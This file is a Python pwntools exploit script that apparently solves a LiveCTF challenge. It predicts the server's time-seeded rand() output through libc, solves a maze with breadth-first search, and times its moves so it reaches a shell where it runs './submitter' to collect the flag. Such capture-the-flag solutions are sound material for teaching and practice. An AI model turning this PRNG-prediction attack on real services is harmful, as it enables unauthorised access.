from pwn import *
import ctypes
from collections import deque

libc = ctypes.CDLL("libc.so.6")

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io  = remote(HOST, int(PORT))

libc.srand(libc.time(0))
for i in range(590):
    libc.rand()
io.sendlineafter(b"Which would you like to do?", b"a")
io.recvline()
io.recvline()
io.recvline()
m = []

while True:
	line = io.recvline()[:-1].decode().strip()
	if line == "":
		break
	m.append(line)

goal = None

for i in m:
	print(repr(i))

for i in range(len(m)):	
	for j in range(len(m[i])):
		if m[i][j] == '*':
			goal = (j,i)


d = {}
q = deque()
q.append((1,1))
d[(1,1)] = ""

dX =  [-1,0,1,0]
dY =  [0,1,0,-1]
nms = "wsen"

while len(q) > 0:
	x,y = q.popleft()
	
	for i in range(4):
		new_x = x + dX[i]
		new_y = y + dY[i]
		t = (new_x,new_y)
		if t not in d and new_x >= 0 and new_x < len(m) and new_y >= 0 and new_y < len(m) and m[new_y][new_x] != '#':
			p = d[(x,y)]+nms[i]
			d[t] = p
			q.append(t)

print(repr(d[goal].replace("\n","")))

for i in d[goal][:-1]:
	libc.rand()
	io.sendline(i)

op = d[goal][-2]
reverse_op = nms[(nms.find(d[goal][-2])+2) % 4]

print(op, reverse_op)
while True:
	a = libc.rand()
	b = libc.rand()
	if a % 0x4bd == 0x4bc:
		break
	elif b % 0x4bd == 0x4bc:
		io.sendline(b"a")
		break
	else:
		
		io.sendline(reverse_op)
		io.sendline(op)

io.sendline(d[goal][-1])

io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
io.close()